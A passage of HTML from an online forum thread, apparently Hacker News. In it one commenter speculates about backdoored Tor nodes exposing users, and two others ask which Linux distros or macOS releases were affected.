their safety - there could be entire chains of backdoored entry, middle and exit nodes exposing vast numbers of TOR users over the past month or so (spies included!).</div><br/><div id="39882083" class="c"><input type="checkbox" id="c-39882083" checked=""/><div class="controls bullet"><span class="by">echoangle</span><span>|</span><a href="#39880339">root</a><span>|</span><a href="#39880638">parent</a><span>|</span><a href="#39882434">next</a><span>|</span><label class="collapse" for="c-39882083">[-]</label><label class="expand" for="c-39882083">[1 more]</label></div><br/><div class="children"><div class="content">Which Distro did you use on the affected devices?</div><br/></div></div><div id="39882434" class="c"><input type="checkbox" id="c-39882434" checked=""/><div class="controls bullet"><span class="by">Klonoar</span><span>|</span><a href="#39880339">root</a><span>|</span><a href="#39880638">parent</a><span>|</span><a href="#39882083">prev</a><span>|</span><label class="collapse" for="c-39882434">[-]</label><label class="expand" for="c-39882434">[1 more]</label></div><br/><div class="children"><div class="content">...maybe list the distros or macOS point releases&#x2F;paths that you found it on macOS. ;P</div><br/></div></div></div></div></div></div></div></div></div></div></div></body></html>